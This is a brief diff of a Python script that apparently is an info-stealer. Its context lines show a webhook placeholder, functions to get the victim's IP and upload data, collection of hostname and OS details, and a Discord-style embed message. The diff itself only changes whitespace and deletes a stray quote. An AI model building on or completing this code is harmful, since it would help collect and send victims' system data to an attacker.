@@ -29,6 +29,7 @@ import sys
 hook = "X"
 DETECTED = False
 
+
 def getip():
     ip = "None"
     try:
@@ -486,6 +487,7 @@ def Reformat(listt):
     while "net" in e:
         e.remove("net")
     return list(set(e))
+
 
 def upload(name, link):
     headers = {
@@ -1222,7 +1224,6 @@ os_version = platform.release()
 os_architecture = platform.machine()
 now = datetime.utcnow()
 hostname = socket.gethostbyaddr(ip_addr)[0]
-"
 
 message = {
     "embeds": [
